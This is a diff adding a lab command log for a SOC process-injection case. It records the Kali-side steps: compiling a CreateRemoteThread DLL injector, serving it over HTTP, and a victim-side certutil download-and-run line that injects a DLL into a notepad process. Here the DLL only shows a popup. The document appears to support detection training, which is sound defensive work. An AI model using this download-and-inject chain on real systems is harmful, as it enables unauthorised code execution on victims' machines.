@@ -1,0 +1,27 @@
+# SOC-Case-Process-Injection — Kali-side commands
+# Attacker: hostname butch, observed IP 192.168.100.107 (this run)
+# Target:   winhome01 / DESKTOP-F0JVTQT / 192.168.100.108, user bryll, notepad.exe PID 2052
+
+# 1. Write the injector source (CreateRemoteThread + LoadLibraryA DLL injection)
+nano injector.c
+#    Full source in 02-Attack-Simulation.md; also visible in evidence/kali-injector.c-exe-payload.png
+
+# 2. Cross-compile 64-bit injector.exe for the Windows target
+x86_64-w64-mingw32-gcc -o injector.exe injector.c
+ls -la injector.exe
+# -> -rwxrwxr-x 1 butch butch 270465 Nov 13 07:48 injector.exe
+#    (evidence/02-kali-malicious-exe-built.png)
+
+# 3. Build payload DLL (illustrative reconstruction; actual source not captured)
+#    x86_64-w64-mingw32-gcc -shared -o inject.dll inject.c
+#    inject.c: DllMain -> MessageBoxA("Injected into remote process - code exec", "PWNED", MB_OK|MB_ICONINFORMATION)
+
+# 4. Serve both files over HTTP for the victim to pull
+python3 -m http.server 80
+#    Victim fetches:  http://192.168.100.107/injector.exe  -> C:\Users\Public\injector.exe  (captured via certutil)
+#                     http://192.168.100.107/inject.dll    -> C:\Users\Public\inject.dll     (delivery not captured)
+
+# 5. (Victim-side, for reference — not Kali)
+#    certutil -urlcache -split -f http://192.168.100.107/injector.exe C:\Users\Public\injector.exe
+#    C:\Users\Public\injector.exe 2052 C:\Users\Public\inject.dll
+#    -> "Successfully injected! Waiting for thread completion..." + "PWNED" popup in notepad.exe
